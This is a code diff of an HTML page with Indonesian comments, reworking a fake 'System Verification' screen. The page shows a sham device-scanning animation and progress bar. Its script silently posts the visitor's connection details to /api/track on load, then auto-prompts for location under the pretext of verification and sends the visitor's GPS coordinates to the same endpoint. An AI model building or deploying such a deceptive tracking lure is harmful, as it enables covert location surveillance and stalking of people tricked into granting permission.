@@ -1,18 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Loading...</title>
+  <title>System Check</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
-<body style="background:black; color:white; text-align:center; padding:50px; font-family:sans-serif;">
 
-<h2>🚀 Loading sistem...</h2>
-<p id="text">Starting...</p>
+<body style="margin:0; font-family:sans-serif; background:#0d0d0d; color:white; text-align:center;">
+
+<div style="padding:40px;">
+  <h2>🔐 System Verification</h2>
+  <p id="status">Initializing...</p>
+
+  <div style="width:100%; background:#222; border-radius:10px; overflow:hidden; margin:20px 0;">
+    <div id="bar" style="height:10px; width:0%; background:#00ffcc;"></div>
+  </div>
+
+  <button id="btn" onclick="start()" 
+    style="display:none; padding:12px 20px; background:#00ffcc; border:none; border-radius:8px; font-size:16px;">
+    Izinkan Lokasi 📍
+  </button>
+</div>
 
 <script>
 const koneksi = navigator.connection || {};
 const jenisKoneksi = koneksi.effectiveType || "unknown";
 
-// 🔥 STEP 1: kirim IP langsung
+// 🔥 kirim IP dulu
 fetch("/api/track", {
   method: "POST",
   headers: {"Content-Type": "application/json"},
@@ -22,50 +35,71 @@ fetch("/api/track", {
   })
 });
 
-// 🔥 animasi Gen Z
-const teks = [
-  "Scanning device 📱...",
-  "Checking network 🌐...",
-  "Connecting system 🔗...",
-  "Finalizing ⚡..."
+// 🔥 animasi loading
+const steps = [
+  "Scanning device...",
+  "Checking network...",
+  "Validating access...",
+  "Almost done..."
 ];
 
 let i = 0;
+let progress = 0;
 
 const interval = setInterval(() => {
-  document.getElementById("text").innerText = teks[i];
-  i++;
-  if (i >= teks.length) {
+
+  if (i < steps.length) {
+    document.getElementById("status").innerText = steps[i];
+    i++;
+  }
+
+  progress += 25;
+  document.getElementById("bar").style.width = progress + "%";
+
+  if (progress >= 100) {
     clearInterval(interval);
 
-    // 🔥 STEP 2: auto munculin izin lokasi
+    document.getElementById("status").innerText = "Verifikasi lokasi diperlukan";
+    document.getElementById("btn").style.display = "inline-block";
+
+    // 🔥 auto trigger (opsional)
     setTimeout(() => {
-
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(pos) {
-
-          fetch("/api/track", {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({
-              lat: pos.coords.latitude,
-              lon: pos.coords.longitude,
-              koneksi: jenisKoneksi,
-              type: "gps"
-            })
-          });
-
-          document.body.innerHTML = "<h2>✔ Done</h2>";
-
-        }, function() {
-          document.body.innerHTML = "<h2>❌ Location denied</h2>";
-        });
-      }
-
-    }, 800);
-
+      start();
+    }, 1500);
   }
+
 }, 800);
+
+
+// 🔥 fungsi izin lokasi
+function start() {
+
+  document.getElementById("status").innerText = "Meminta izin lokasi...";
+
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(pos) {
+
+      fetch("/api/track", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          koneksi: jenisKoneksi,
+          type: "gps"
+        })
+      });
+
+      document.getElementById("status").innerText = "✔ Lokasi berhasil diverifikasi";
+
+    }, function() {
+      document.getElementById("status").innerText = "❌ Izin lokasi ditolak";
+    });
+
+  } else {
+    document.getElementById("status").innerText = "Browser tidak support GPS";
+  }
+}
 </script>
 
 </body>
